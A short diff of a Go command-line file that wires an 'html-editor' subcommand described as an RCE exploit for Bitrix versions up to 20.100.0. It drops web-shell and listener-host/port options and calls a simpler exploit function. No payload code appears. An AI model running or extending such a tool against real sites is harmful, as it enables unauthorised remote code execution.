@@ -37,12 +37,8 @@ var editorCmd = &cobra.Command{
 	Use:   "html-editor",
 	Short: "Exploit RCE via html editor (Bitrix <= 20.100.0).",
 	Run: func(cmd *cobra.Command, args []string) {
-		webshell, _ := cmd.Flags().GetBool("web-shell")
 		target, _ := cmd.Flags().GetString("url")
-		lhost, _ := cmd.Flags().GetString("lhost")
-		lport, _ := cmd.Flags().GetString("lport")
-		agentId, _ := cmd.Flags().GetString("agentId")
-		_, _, err := va.Exploit(target, lhost, lport, agentId, webshell)
+		err := he.Exploit(target)
 		if err != nil {
 			colors.BAD.Println(err)
 		}
